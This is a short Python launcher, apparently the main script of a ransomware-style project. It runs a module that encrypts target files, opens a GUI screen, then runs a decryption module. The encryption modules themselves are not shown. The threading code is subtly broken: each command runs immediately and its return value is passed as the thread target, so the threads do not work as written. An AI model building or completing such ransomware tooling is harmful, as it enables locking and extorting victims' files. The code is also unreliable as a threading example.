from os import system
import threading

#Encrypting Files
system('python encryptionModules\\encryptTarget.py')

#GUI
guiThread= threading.Thread(target = (system('python gui\\guiWL.py ')))

#Decrypting Files
decrypThread = threading.Thread(target = (system('python encryptionModules\\decryptTarget.py')))

guiThread.start()
guiThread.join()

decrypThread.start()
decrypThread.join()

